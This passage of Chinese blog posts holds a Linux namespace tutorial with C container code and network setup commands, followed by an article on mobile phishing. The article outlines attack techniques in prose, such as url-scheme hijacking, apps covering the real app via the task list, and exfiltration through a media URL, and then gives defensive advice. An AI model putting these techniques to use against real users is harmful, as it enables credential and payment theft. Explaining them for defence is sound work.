​    "/bin/bash",

​    "-l",

​    **NULL**

};

**int** container_main(**void*** arg)

{

​    printf("Container [%5d] - inside the container!\n", getpid());

​    //set hostname

​    sethostname("container",10);

​    //remount "/proc" to make sure the "top" and "ps" show container's information

​    **if** (mount("proc", "rootfs/proc", "proc", 0, **NULL**) !=0 ) {

​        perror("proc");

​    }

​    **if** (mount("sysfs", "rootfs/sys", "sysfs", 0, **NULL**)!=0) {

​        perror("sys");

​    }

​    **if** (mount("none", "rootfs/tmp", "tmpfs", 0, **NULL**)!=0) {

​        perror("tmp");

​    }

​    **if** (mount("udev", "rootfs/dev", "devtmpfs", 0, **NULL**)!=0) {

​        perror("dev");

​    }

​    **if** (mount("devpts", "rootfs/dev/pts", "devpts", 0, **NULL**)!=0) {

​        perror("dev/pts");

​    }

​    **if** (mount("shm", "rootfs/dev/shm", "tmpfs", 0, **NULL**)!=0) {

​        perror("dev/shm");

​    }

​    **if** (mount("tmpfs", "rootfs/run", "tmpfs", 0, **NULL**)!=0) {

​        perror("run");

​    }

​    /* 

​     \* 模仿Docker的从外向容器里mount相关的配置文件 

​     \* 你可以查看：/var/lib/docker/containers/<container_id>/目录，

​     \* 你会看到docker的这些文件的。

​     */

​    **if** (mount("conf/hosts", "rootfs/etc/hosts", "none", MS_BIND, **NULL**)!=0 ||

​          mount("conf/hostname", "rootfs/etc/hostname", "none", MS_BIND, **NULL**)!=0 ||

​          mount("conf/resolv.conf", "rootfs/etc/resolv.conf", "none", MS_BIND, **NULL**)!=0 ) {

​        perror("conf");

​    }

​    /* 模仿docker run命令中的 -v, --volume=[] 参数干的事 */

​    **if** (mount("/tmp/t1", "rootfs/mnt", "none", MS_BIND, **NULL**)!=0) {

​        perror("mnt");

​    }

​    /* chroot 隔离目录 */

​    **if** ( chdir("./rootfs") != 0 || chroot("./") != 0 ){

​        perror("chdir/chroot");

​    }

​    execv(container_args[0], container_args);

​    perror("exec");

​    printf("Something's wrong!\n");

​    **return** 1;

}

**int** main()

{

​    printf("Parent [%5d] - start a container!\n", getpid());

​    **int** container_pid = clone(container_main, container_stack+STACK_SIZE, 

​            CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWPID | CLONE_NEWNS | SIGCHLD, **NULL**);

​    waitpid(container_pid, **NULL**, 0);

​    printf("Parent - container stopped!\n");

​    **return** 0;

}

</container_id></unistd.h></signal.h></sched.h></stdio.h></sys></sys></sys>

sudo运行上面的程序，你会看到下面的挂载信息以及一个所谓的“镜像”：

hchen@ubuntu:~$ sudo ./mount 

Parent [ 4517] - start a container!

Container [    1] - inside the container!

root@container:/# mount

proc on /proc type proc (rw,relatime)

sysfs on /sys type sysfs (rw,relatime)

none on /tmp type tmpfs (rw,relatime)

udev on /dev type devtmpfs (rw,relatime,size=493976k,nr_inodes=123494,mode=755)

devpts on /dev/pts type devpts (rw,relatime,mode=600,ptmxmode=000)

tmpfs on /run type tmpfs (rw,relatime)

/dev/disk/by-uuid/18086e3b-d805-4515-9e91-7efb2fe5c0e2 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro,data=ordered)

/dev/disk/by-uuid/18086e3b-d805-4515-9e91-7efb2fe5c0e2 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro,data=ordered)

/dev/disk/by-uuid/18086e3b-d805-4515-9e91-7efb2fe5c0e2 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro,data=ordered)

root@container:/# ls /bin /usr/bin

/bin:

bash   chmod  echo  hostname  less  more  mv   ping  rm   sleep  tail  test    top   truncate  uname

cat    chown  grep  ip        ln    mount  nc   ps    sed  tabs   tar   timeout  touch  tty     which

chgrp  cp     gzip  kill      ls    mountpoint  netstat  pwd   sh   tac    tee   toe    tr   umount

/usr/bin:

awk  env  groups  head  id  mesg  sort  strace  tail  top  uniq  vi  wc  xargs

关于如何做一个chroot的目录，这里有个工具叫[DebootstrapChroot](https://wiki.ubuntu.com/DebootstrapChroot)，你可以顺着链接去看看（英文的哦）

接下来的事情，你可以自己玩了，我相信你的想像力 。：）

在下一篇，我将向你介绍User Namespace、Network Namespace以及Namespace的其它东西。

**[<<<< Docker基础技术：Linux Namespace（下）>>>>](https://coolshell.cn/articles/17029.html)**

（上篇完，[请参看下篇](https://coolshell.cn/articles/17029.html)）

# DOCKER基础技术：LINUX NAMESPACE（下）

#####  [2015年04月16日 ](https://coolshell.cn/articles/17029.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [51 条评论](https://coolshell.cn/articles/17029.html#comments) 98,230 人阅读

![jail_cell](photo/jail_cell.jpg)在 **[Docker基础技术：Linux Namespace（上篇）](https://coolshell.cn/articles/17010.html)**中我们了解了，UTD、IPC、PID、Mount 四个namespace，我们模仿Docker做了一个相当相当山寨的镜像。在这一篇中，主要想向大家介绍Linux的User和Network的Namespace。

好，下面我们就介绍一下还剩下的这两个Namespace。

目录



[User Namespace](https://coolshell.cn/articles/17029.html#User_Namespace)[Network Namespace](https://coolshell.cn/articles/17029.html#Network_Namespace)[Namespace文件](https://coolshell.cn/articles/17029.html#Namespace文件)[参考文档](https://coolshell.cn/articles/17029.html#参考文档)

#### User Namespace

User Namespace主要是用了CLONE_NEWUSER的参数。使用了这个参数后，内部看到的UID和GID已经与外部不同了，默认显示为65534。那是因为容器找不到其真正的UID所以，设置上了最大的UID（其设置定义在/proc/sys/kernel/overflowuid）。

要把容器中的uid和真实系统的uid给映射在一起，需要修改 **/proc/<pid>/uid_map** 和 **/proc/<pid>/gid_map** 这两个文件。这两个文件的格式为：

``**ID-inside-ns ID-outside-ns length**

其中：



- 第一个字段ID-inside-ns表示在容器显示的UID或GID，
- 第二个字段ID-outside-ns表示容器外映射的真实的UID或GID。
- 第三个字段表示映射的范围，一般填1，表示一一对应。

比如，把真实的uid=1000映射成容器内的uid=0

```
$ cat /proc/2465/uid_map
         0       1000          1
```

再比如下面的示例：表示把namespace内部从0开始的uid映射到外部从0开始的uid，其最大范围是无符号32位整形

```
$ cat /proc/$$/uid_map
         0          0          4294967295
```

另外，需要注意的是：

- 写这两个文件的进程需要这个namespace中的CAP_SETUID (CAP_SETGID)权限（可参看[Capabilities](http://man7.org/linux/man-pages/man7/capabilities.7.html)）
- 写入的进程必须是此user namespace的父或子的user namespace进程。
- 另外需要满如下条件之一：1）父进程将effective uid/gid映射到子进程的user namespace中，2）父进程如果有CAP_SETUID/CAP_SETGID权限，那么它将可以映射到父进程中的任一uid/gid。

这些规则看着都烦，我们来看程序吧（下面的程序有点长，但是非常简单，如果你读过《Unix网络编程》上卷，你应该可以看懂）：

```
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/capability.h>
#include <stdio.h>
#include <sched.h>
#include <signal.h>
#include <unistd.h>

#define STACK_SIZE (1024 * 1024)

static char container_stack[STACK_SIZE];
char* const container_args[] = {
    "/bin/bash",
    NULL
};

int pipefd[2];

void set_map(char* file, int inside_id, int outside_id, int len) {
    FILE* mapfd = fopen(file, "w");
    if (NULL == mapfd) {
        perror("open file error");
        return;
    }
    fprintf(mapfd, "%d %d %d", inside_id, outside_id, len);
    fclose(mapfd);
}

void set_uid_map(pid_t pid, int inside_id, int outside_id, int len) {
    char file[256];
    sprintf(file, "/proc/%d/uid_map", pid);
    set_map(file, inside_id, outside_id, len);
}

void set_gid_map(pid_t pid, int inside_id, int outside_id, int len) {
    char file[256];
    sprintf(file, "/proc/%d/gid_map", pid);
    set_map(file, inside_id, outside_id, len);
}

int container_main(void* arg)
{

    printf("Container [%5d] - inside the container!\n", getpid());

    printf("Container: eUID = %ld;  eGID = %ld, UID=%ld, GID=%ld\n",
            (long) geteuid(), (long) getegid(), (long) getuid(), (long) getgid());

    /* 等待父进程通知后再往下执行（进程间的同步） */
    char ch;
    close(pipefd[1]);
    read(pipefd[0], &ch, 1);

    printf("Container [%5d] - setup hostname!\n", getpid());
    //set hostname
    sethostname("container",10);

    //remount "/proc" to make sure the "top" and "ps" show container's information
    mount("proc", "/proc", "proc", 0, NULL);

    execv(container_args[0], container_args);
    printf("Something's wrong!\n");
    return 1;
}

int main()
{
    const int gid=getgid(), uid=getuid();

    printf("Parent: eUID = %ld;  eGID = %ld, UID=%ld, GID=%ld\n",
            (long) geteuid(), (long) getegid(), (long) getuid(), (long) getgid());

    pipe(pipefd);
 
    printf("Parent [%5d] - start a container!\n", getpid());

    int container_pid = clone(container_main, container_stack+STACK_SIZE, 
            CLONE_NEWUTS | CLONE_NEWPID | CLONE_NEWNS | CLONE_NEWUSER | SIGCHLD, NULL);

    
    printf("Parent [%5d] - Container [%5d]!\n", getpid(), container_pid);

    //To map the uid/gid, 
    //   we need edit the /proc/PID/uid_map (or /proc/PID/gid_map) in parent
    //The file format is
    //   ID-inside-ns   ID-outside-ns   length
    //if no mapping, 
    //   the uid will be taken from /proc/sys/kernel/overflowuid
    //   the gid will be taken from /proc/sys/kernel/overflowgid
    set_uid_map(container_pid, 0, uid, 1);
    set_gid_map(container_pid, 0, gid, 1);

    printf("Parent [%5d] - user/group mapping done!\n", getpid());

    /* 通知子进程 */
    close(pipefd[1]);

    waitpid(container_pid, NULL, 0);
    printf("Parent - container stopped!\n");
    return 0;
}
```

上面的程序，我们用了一个pipe来对父子进程进行同步，为什么要这样做？因为子进程中有一个execv的系统调用，这个系统调用会把当前子进程的进程空间给全部覆盖掉，我们希望在execv之前就做好user namespace的uid/gid的映射，这样，execv运行的/bin/bash就会因为我们设置了uid为0的inside-uid而变成#号的提示符。

整个程序的运行效果如下：

```
hchen@ubuntu:~$ id
uid=1000(hchen) gid=1000(hchen) groups=1000(hchen)

hchen@ubuntu:~$ ./user #<--以hchen用户运行
Parent: eUID = 1000;  eGID = 1000, UID=1000, GID=1000 
Parent [ 3262] - start a container!
Parent [ 3262] - Container [ 3263]!
Parent [ 3262] - user/group mapping done!
Container [    1] - inside the container!
Container: eUID = 0;  eGID = 0, UID=0, GID=0 #<---Container里的UID/GID都为0了
Container [    1] - setup hostname!

root@container:~# id #<----我们可以看到容器里的用户和命令行提示符是root用户了
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
```

虽然容器里是root，但其实这个容器的/bin/bash进程是以一个普通用户hchen来运行的。这样一来，我们容器的安全性会得到提高。

我们注意到，User Namespace是以普通用户运行，但是别的Namespace需要root权限，那么，如果我要同时使用多个Namespace，该怎么办呢？一般来说，我们先用一般用户创建User Namespace，然后把这个一般用户映射成root，在容器内用root来创建其它的Namesapce。

#### Network Namespace

Network的Namespace比较啰嗦。在Linux下，我们一般用ip命令创建Network Namespace（Docker的源码中，它没有用ip命令，而是自己实现了ip命令内的一些功能——是用了Raw Socket发些“奇怪”的数据，呵呵）。这里，我还是用ip命令讲解一下。

首先，我们先看个图，下面这个图基本上就是Docker在宿主机上的网络示意图（其中的物理网卡并不准确，因为docker可能会运行在一个VM中，所以，这里所谓的“物理网卡”其实也就是一个有可以路由的IP的网卡）

![network.namespace](photo/network.namespace.jpg)

上图中，Docker使用了一个私有网段，172.40.1.0，docker还可能会使用10.0.0.0和192.168.0.0这两个私有网段，关键看你的路由表中是否配置了，如果没有配置，就会使用，如果你的路由表配置了所有私有网段，那么docker启动时就会出错了。

当你启动一个Docker容器后，你可以使用ip link show或ip addr show来查看当前宿主机的网络情况（我们可以看到有一个docker0，还有一个veth22a38e6的虚拟网卡——给容器用的）：

```
hchen@ubuntu:~$ ip link show
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state ... 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc ...
    link/ether 00:0c:29:b7:67:7d brd ff:ff:ff:ff:ff:ff
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    link/ether 56:84:7a:fe:97:99 brd ff:ff:ff:ff:ff:ff
5: veth22a38e6: <BROADCAST,UP,LOWER_UP> mtu 1500 qdisc ...
    link/ether 8e:30:2a:ac:8c:d1 brd ff:ff:ff:ff:ff:ff
```

那么，要做成这个样子应该怎么办呢？我们来看一组命令：

```
## 首先，我们先增加一个网桥lxcbr0，模仿docker0
brctl addbr lxcbr0
brctl stp lxcbr0 off
ifconfig lxcbr0 192.168.10.1/24 up #为网桥设置IP地址

## 接下来，我们要创建一个network namespace - ns1

# 增加一个namesapce 命令为 ns1 （使用ip netns add命令）
ip netns add ns1 

# 激活namespace中的loopback，即127.0.0.1（使用ip netns exec ns1来操作ns1中的命令）
ip netns exec ns1   ip link set dev lo up 

## 然后，我们需要增加一对虚拟网卡

# 增加一个pair虚拟网卡，注意其中的veth类型，其中一个网卡要按进容器中
ip link add veth-ns1 type veth peer name lxcbr0.1

# 把 veth-ns1 按到namespace ns1中，这样容器中就会有一个新的网卡了
ip link set veth-ns1 netns ns1

# 把容器里的 veth-ns1改名为 eth0 （容器外会冲突，容器内就不会了）
ip netns exec ns1  ip link set dev veth-ns1 name eth0 

# 为容器中的网卡分配一个IP地址，并激活它
ip netns exec ns1 ifconfig eth0 192.168.10.11/24 up


# 上面我们把veth-ns1这个网卡按到了容器中，然后我们要把lxcbr0.1添加上网桥上
brctl addif lxcbr0 lxcbr0.1

# 为容器增加一个路由规则，让容器可以访问外面的网络
ip netns exec ns1     ip route add default via 192.168.10.1

# 在/etc/netns下创建network namespce名称为ns1的目录，
# 然后为这个namespace设置resolv.conf，这样，容器内就可以访问域名了
mkdir -p /etc/netns/ns1
echo "nameserver 8.8.8.8" > /etc/netns/ns1/resolv.conf
```

上面基本上就是docker网络的原理了，只不过，

- Docker的resolv.conf没有用这样的方式，而是用了[上篇中的Mount Namesapce的那种方式](https://coolshell.cn/articles/17010.html)
- 另外，docker是用进程的PID来做Network Namespace的名称的。

了解了这些后，你甚至可以为正在运行的docker容器增加一个新的网卡：

```
ip link add peerA type veth peer name peerB 
brctl addif docker0 peerA 
ip link set peerA up 
ip link set peerB netns ${container-pid} 
ip netns exec ${container-pid} ip link set dev peerB name eth1 
ip netns exec ${container-pid} ip link set eth1 up ; 
ip netns exec ${container-pid} ip addr add ${ROUTEABLE_IP} dev eth1 ;
```

上面的示例是我们为正在运行的docker容器，增加一个eth1的网卡，并给了一个静态的可被外部访问到的IP地址。

这个需要把外部的“物理网卡”配置成混杂模式，这样这个eth1网卡就会向外通过ARP协议发送自己的Mac地址，然后外部的交换机就会把到这个IP地址的包转到“物理网卡”上，因为是混杂模式，所以eth1就能收到相关的数据，一看，是自己的，那么就收到。这样，Docker容器的网络就和外部通了。

当然，无论是Docker的NAT方式，还是混杂模式都会有性能上的问题，NAT不用说了，存在一个转发的开销，混杂模式呢，网卡上收到的负载都会完全交给所有的虚拟网卡上，于是就算一个网卡上没有数据，但也会被其它网卡上的数据所影响。

这两种方式都不够完美，我们知道，真正解决这种网络问题需要使用VLAN技术，于是Google的同学们为Linux内核实现了一个[IPVLAN的驱动](https://lwn.net/Articles/620087/)，这基本上就是为Docker量身定制的。

#### Namespace文件

上面就是目前Linux Namespace的玩法。 现在，我来看一下其它的相关东西。

让我们运行一下上篇中的那个pid.mnt的程序（也就是PID Namespace中那个mount proc的程序），然后不要退出。

```
$ sudo ./pid.mnt 
[sudo] password for hchen: 
Parent [ 4599] - start a container!
Container [    1] - inside the container!
```

我们到另一个shell中查看一下父子进程的PID：

```
hchen@ubuntu:~$ pstree -p 4599
pid.mnt(4599)───bash(4600)
```

我们可以到proc下（/proc//ns）查看进程的各个namespace的id（内核版本需要3.8以上）。

下面是父进程的：

```
hchen@ubuntu:~$ sudo ls -l /proc/4599/ns
total 0
lrwxrwxrwx 1 root root 0  4月  7 22:01 ipc -> ipc:[4026531839]
lrwxrwxrwx 1 root root 0  4月  7 22:01 mnt -> mnt:[4026531840]
lrwxrwxrwx 1 root root 0  4月  7 22:01 net -> net:[4026531956]
lrwxrwxrwx 1 root root 0  4月  7 22:01 pid -> pid:[4026531836]
lrwxrwxrwx 1 root root 0  4月  7 22:01 user -> user:[4026531837]
lrwxrwxrwx 1 root root 0  4月  7 22:01 uts -> uts:[4026531838]
```

下面是子进程的：

```
hchen@ubuntu:~$ sudo ls -l /proc/4600/ns
total 0
lrwxrwxrwx 1 root root 0  4月  7 22:01 ipc -> ipc:[4026531839]
lrwxrwxrwx 1 root root 0  4月  7 22:01 mnt -> mnt:[4026532520]
lrwxrwxrwx 1 root root 0  4月  7 22:01 net -> net:[4026531956]
lrwxrwxrwx 1 root root 0  4月  7 22:01 pid -> pid:[4026532522]
lrwxrwxrwx 1 root root 0  4月  7 22:01 user -> user:[4026531837]
lrwxrwxrwx 1 root root 0  4月  7 22:01 uts -> uts:[4026532521]
```

我们可以看到，其中的ipc，net，user是同一个ID，而mnt,pid,uts都是不一样的。如果两个进程指向的namespace编号相同，就说明他们在同一个namespace下，否则则在不同namespace里面。

这些文件还有另一个作用，那就是，一旦这些文件被打开，只要其fd被占用着，那么就算PID所属的所有进程都已经结束，创建的namespace也会一直存在。比如：我们可以通过：mount –bind /proc/4600/ns/uts ~/uts 来hold这个namespace。

另外，我们在上篇中讲过一个setns的系统调用，其函数声明如下：

```
int setns(int fd, int nstype);
```

其中第一个参数就是一个fd，也就是一个open()系统调用打开了上述文件后返回的fd，比如：

```
fd = open("/proc/4600/ns/nts", O_RDONLY);  // 获取namespace文件描述符
setns(fd, 0); // 加入新的namespace
```

#### 参考文档

- - [Namespaces in operation](http://lwn.net/Articles/531114/)
  - [Linux Namespace Man Page](http://man7.org/linux/man-pages/man7/namespaces.7.html)
  - [Creat Containers – Part 1](http://crosbymichael.com/creating-containers-part-1.html)
  - [Introduction to Linux namespaces](https://blog.jtlebi.fr/2013/12/22/introduction-to-linux-namespaces-part-1-uts/)

（应网友card323加入）

（全文完）

# 关于移动端的钓鱼式攻击

#####  [2015年04月14日 ](https://coolshell.cn/articles/17066.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [55 条评论](https://coolshell.cn/articles/17066.html#comments) 56,669 人阅读

![phishing-1](photo/phishing-1.jpg)今天，在微博上看了一篇《[微信和淘宝到底是谁封谁](http://weibo.com/p/1001603830475402664763)》的文章，我觉得文章中逻辑错乱，所以，我发了一篇[关于这篇文章逻辑问题的长微博](http://weibo.com/p/1001603831131286939079)。后面，我被原博主冷嘲热讽了一番，说是什么鸡汤啊，什么我与某某之流的人在一起混淆视听啊，等等。并且也有一些网友找我讨论一下相关的钓鱼式攻击的技术问题。所以，我想写下这篇纯技术文章，因为我对那些商业利益上的东西不关心，所以，只谈技术，这样最简单。

首先说明一下，**我个人不是一个安全专家，也不是一个移动开发专家，按道理来说，这篇文章不应该我来写，但是我就试一试，请原谅我的无知，也期待抛砖引玉了，希望安全的同学斧正**。

关于钓鱼式攻击，其实是通过一种社会工程学的方式来愚弄用户的攻击式，攻击者通常会模仿一个用户信任的网站来偷取用户的机密信息，比如用户密码或是信用卡。一般来说，攻击者会通过邮件和实时通信工具完成，给被攻击者发送一个高仿的网站，然后让用户看不出来与正统网站的差别，然后收集用户的机密数据。

目录



[移动端钓鱼攻击点分析](https://coolshell.cn/articles/17066.html#移动端钓鱼攻击点分析)[攻击方式](https://coolshell.cn/articles/17066.html#攻击方式)[从一个应用唤起另一个应用的方式](https://coolshell.cn/articles/17066.html#从一个应用唤起另一个应用的方式)[在一个应用内内嵌Web的方式](https://coolshell.cn/articles/17066.html#在一个应用内内嵌Web的方式)[怎么防范钓鱼式攻击](https://coolshell.cn/articles/17066.html#怎么防范钓鱼式攻击)[关于微信和淘宝](https://coolshell.cn/articles/17066.html#关于微信和淘宝)

#### 移动端钓鱼攻击点分析

因为钓鱼式攻击并不新鲜，所以我这里只讲移动方面的。

在移动端，这个事情会更容易干，因为移动端有如下特点：

- 移动端的UI只能有一个应用占据整个屏幕，你只能看到一个应用，而且用户屏幕小，能显示的信息有限，比如浏览器里的网址是显示不全的。这会给钓鱼攻击有很多可乘之机。

- 移动端的平台有其安全的设计。每个应用都是隔离开的，一个应用无法获取另一个应用的数据。而且应用的下载基本上来说都是来自合法的地方。比如iOS的设备通过App Store下载，每个程序都有自己的签名保证不会被篡改。而且移动端的的应用有各种权限配置，这样也能很大程度提高安全性。

- 移动端的APP有些有些是收费的，所以自然会有盗版需求，虽然在平台上做了一些安全设计，但是并不完美。用户可以越狱，可以root。这给恶意软件有了可乘之机。

下面我们来分析下移动端的用户操作，我们重点关注用户控制权的切换过程（因为这是攻击点）



在移动设备上，基本上来说，用户的控制切换有四种：

- 从一个APP切到另一个APP，也就是我们所谓的唤出APP。
- 从一个APP唤出一个Web，常见为一个嵌入式的WebView或是一个浏览器
- 从一个Web唤出一个APP，这需要浏览器支持一些非标准的HTTP协议，比如skype://之类的。
- 从一个Web到另一个Web，这和Web上的方式差不多。

基本上来说，**黑客的攻击从来都是找这样的转换环节来做文章的，并且需要一个用户非常熟悉的场景（这样用户才会放松警惕）**。

通过观察移动APP的特性，我们可以知道，当用户控制切换时，有下面的这些特性：

- 到另一个APP时，需要用户登录（如果登录的session过期了）
- 当支付的时候，需要用户输入支付信息（信用卡信息、支持密码）

那么用户在移动APP上经常做的事是什么？

- **社交分享**：分享到微博，分享到微信等等，分享的时候，可能需要你输入用户名和口令。

- **应用内购**：一般来说APP会有两种，一种免费的，一种是收费的，大量的用户都是下载免费的，然后通过什么“开通更多关卡”、“去广告”、“买道具”之类的东西，让用户输入支付信息。Apple的支付的时候也会要用户输入Apple ID的密码。

- **点击链接**：有时候，我们收到短信，或是二维码，或是一个微信微博，会让我们去点击一个网站链接，这个网站链接要么就是打开一个网页，要么就是启动应用，要么就是跳转到应用市场去下载应用（如果你没安装）。

所以，一个好的钓鱼式攻击一定会从这些地方入手，然后高仿UI以及交互流程，这个交互流程和用户日常操作的完全一样，让用户无法察觉。任何方式的钓鱼攻击简单来说，会有两种：

- **一种是直接攻击：**你下载了一个恶意的APP，或是打开了一个恶意的冒牌APP。
- **一种是中间人攻击：**用户控制权转换时的两端都是正规应用，但是中间的过程不是正常的。

#### 攻击方式

下面是一些常见的攻击方式：

##### 从一个应用唤起另一个应用的方式

**直接攻击**

当你点击一个社交分享按钮，或是一个支付按钮的时候。就会转到一个页面，这个页面需要你输入用户机密信息（密码或是支付信息），然后再唤起真正的APP。

一个有恶意的APP可能会让你放松警惕，因为，这个你在安装这个APP的时候，你会发现这个APP根本不需要任何的权限（Android上的），甚至连网络访问的权限都不要，因为在Android下，App可以通过别的组件访问互联网，比如：恶意应用可能创建一个MediaPlayer Object，然后就可以通过这个对象访问一个URL然后把偷到的信息发送出去。

你的手机要被安装一个恶意的应用并不难，同样通过社工的方式，比如：盗版，色情，伪装成客服等等通过人性的弱点让你去一些非受信的市场上安装。iOS设备上的应用也可以不用通过App Store安装（通过itms-services协议，可以通过safari浏览器直接在IOS设备上安装应用程序）。

还有，人们都是贪小便宜的人，所以，会到某些地方买一些便宜的手机（比如淘宝），现在的高仿手机，翻新的二手手机对于一般人甚至安全专家来说完全没有识别能力。这些手机中有很大可能藏有恶意程序。你千万不要以为你格式化手机就OK了。今天（2015年4月14日）早上CCTV2台的“第一时间”就说了一个案例，你可以看看。另外，你可以看看相关的新闻。（另外，你把你的旧手机卖了也要小心，因为你的数据就在里面，旧手机已经成了一个灰色产业链）

另外，Apple的App需要有一个review过程，这个过程对大众是神秘的，但我觉得应该会包括安全方面的review。不过，这个审核过程可能也有空子可以钻。比如：在review的时候，这个应用完全正常，但在用户使用的时候，会自己从网站下载一些自己的配置文件而改变行为（更为直接的就是访问外部网页时在审核时和在用户应用时可能完全不一样，Apple应该完全没有能力审核应用要访问的外部站点）

**中间人攻击**

我们知道，一个APP唤起另一个APP好多都是用url-scheme的，也就是某种协议，审核这样的协议非常简单，所以如果有恶意的东西在里面基本上很容易看到。但是，如果某些APP并没有注册自己的url-scheme，或是没有被安装，反而，另一个有恶意的APP注册了这个scheme，那么，就会导致恶意的APP被唤起来了（**这就是我为什么在我的微博中说，如果用户没有安装淘宝的客户端，那么，让微信唤起淘宝的客户端时，有可能是另一个有恶意的APP。但是很多人不懂这个事。在iOS下，两个APP通讯正确的做法是“钥匙串机制”**）。

当然如果有两个应用被注册了同一个scheme，那么，iOS和Android会给出一个选择，让用户来选（注：iOS的系统有可能会直接跳某个 App 上去，不同版本的跳规则不明确，可以认为是随机跳转）。于是乎，恶意的APP就要努力的让自己比正规的APP看起来更像个正规的APP就可以了。

在Android平台上，这个事可能更变态，只要恶意的应用有两个权限，一个是随手机操作系统在后台启动，一个是task list（然而这两个权限都是一般权限）。这样一来，当你进行两个APP切换时，恶意程序可以通过task list权限监控到，然后自己马上先于正规的app出现，等到收集完用户数据后简单的退出就好了。这个方式只需要你的程序能在10ms以内反应过来（最佳是5ms左右），人的肉眼根本看不出来。（在iOS设备下，除了jail break后的iPhone可以这么干，正常的都iPhone还没有找到这样的攻击方式）

##### 在一个应用内内嵌Web的方式

这种方式更容易攻击了，现在很多很多应用都是内嵌的Web的形式，你完全不知道打开的网页的网站是什么，因为这些内嵌的WebView你连地址都看不见。而且无论是iOS或Android，其WebView都可以执行任何的Javascript代码，就算显示URL，URL也可能是被混乱过的，你也看不全，你也很容易上当。当然，那些使用带SSL证书的支持HTTPS的网站（尤其是EV证书）可以在地址栏上显示一个绿色的标记表示你访问的就是正确网址，但是并不是所有的浏览器都会这样，比如iPhone的Safari并没有这个提示，所以，你一定要用Chrome。

更狠的是就算你打开的是一个正确的URL，你依然可能被中间人攻击。尤其是这个网站使用了明文的HTTP协议，而你又喜欢蹭那些免费的WiFi，于是很容易给把服务器返回给你的网页中做修改，比如，修改网页中login表单或是支付表单提交的网站（想想天朝的网络运营商给你访问的正常的网页弹广告这事吧）

关于DNS劫持，有些人觉得这事可能遇不上，因为这是一个全网的问题，如果你有这样的想法你就错了。还是那样，你爱占便宜，蹭上那些没有密码的WiFi，你完不知道，你连上去的那个WiFi会设置什么样的DNS服务器，你输入了www.taobao.com，但你打开的网站根本就是不是淘定，而是一个钓鱼网站。你会知道你打开的是错的了么？基本不可能。所以，安全点的网站都是要用HTTPS，但是还是那句话，iPhone的Safari并不会提示你打开网站的SSL证书合不合法（事实上，在手机上的很多浏览器都不会这提示，只有Chrome会）。

关于攻击的方式我不想讲太多，还有很多高级+猥琐的方式我也不是完全知道，知道了我也不说，不然，教人犯罪了。

关于从Web端唤起APP是和，APP唤醒APP的攻击方式基本一样。我就不说了。

#### 怎么防范钓鱼式攻击

首先，我们要知道，钓鱼式攻击是一件非常难搞的事。要搞定这个事，一般来说需要四个方面：**立法层面**、**用户培训层面**、**宣传层面**、与**技术保全措施层面**。

**教育方面**

打击网钓的策略之一，是试着培养人们识别网钓，并教导怎样处理这些问题。只需要稍稍修改人们浏览习惯的方式，很多问题都可以避免。随着人们越来越认识到网钓者所使用的社会工程学技俩，传统的网钓欺诈技术可能在未来过时。

- 对别人发来的链接要小心，尤其是让你输入机密信息的链接要小心检查。

- 到正规的地方买手机，不要贪图小便宜。旧手机在卖前要“物理删除”数据。

- 不要对手机越狱，不要root。

- 不要从非信任的地方下载软件。

- 要小心免费的WiFi。

- 输入机密数据的时候一定要小心检查。

- 多依赖一些不同的安全体系，比如：网上支付不要只依赖支付宝，尽量使用信用卡（信用卡千万不要设密码），这样就算是被钓鱼了，你还有一个银行安全的缓冲地带——可以不承认交易。

- 现在使用手机的频率越来越高，所以，我非常建议你使用更为安全的iPhone手机，一定要打开“查找我的iPhone”功能，然后设上开机密码。iPhone手机可以做到手机丢失了别人都无法使用，包括刷机都刷不了（iOS7以上版本）

- 对于一些关键网站，开启两步验证，这样就算你的用户名和密码被钓走了，还有一个动态手机口令做为登录的关卡。

**技术方面**

- 利用SSL证书来保证从浏览器到网站的访问是现在采用比较多的方式，也是在理论上可行的方式。现代的浏览器都会在URL上放上一个锁的标志，对于EV证书，你会看到浏览器的URL是绿色的（很容易分辨）

- 另外，像firefox浏览器有一个petname的插件，你可以为你常上的网站设置一些标签。这样，当你打开钓鱼网站的时候，你会发现这些标签没有显示出来，那就有问题了。

- 关于SSL的CA认证机构，你需要管理好你浏览的那些根证书，有些根证书你需要删掉。

- 还有一种打击网钓的流行作法是保持一份已知的网钓网站名单，并随时更新。比如[PhishTank](https://www.phishtank.com/)，以及[中国防钓鱼网站联盟](http://www.apac.cn/)。

- 增加式登录方式。这种方式被美国银行采用，就是说，你可以上传一个你自己知道的图片，而当你打开登录页面里时，输入了自己的用户名后，你会看到你设置的这个图片被显示出来。如果没有或是显示错了，表示你打开的是钓鱼网站。

- 两步验证，通过用户自设密码+手机动态口令登录（好些网站都在使用Google Authenticator的方式，这有点像公司VPN的动态口令）。

上述都是PC Web上的防范，然而我们的手机移动端做的并不够好，移动端的安全还是要加油。

**安全风控方面**

**什么叫安全风控，说白了就是拿钱出来赔偿给被骗的用户，大家相信我，这个事情在基本上所有的公司都会做的**，也就是说，无论你怎么做安全也无法保证绝对的安全，你只能缓解或是降低用户被骗的数量或概率。所以，几乎所有的公司都会有一笔钱专门用来赔偿。

在西方国家，用户体验很好，我说一个故事，我有一个妹妹在英国，有一天她到ATM上取钱，取完钱后忘了把卡取出，结果后面的人把她的卡里的钱取走了，于是她报了警，等警察做完笔录后，她给银行的客服打了个电话说明了情况，本想冻结银行卡的，但是银行方面二话不说就赔偿了她所有的损失。为什么英国的巴克莱银行这么痛快，是因为他们有风控基金，专门用来处理这样的事的。

在中国，其实银行和一些大的公司都有这笔安全风控基金，但是，要你非常坚持不懈地申诉，他们才会赔给你，而且还不是全部。要全部的话，我估计你要做一个“刁民”，否则欺负你，没道理。

#### 关于微信和淘宝

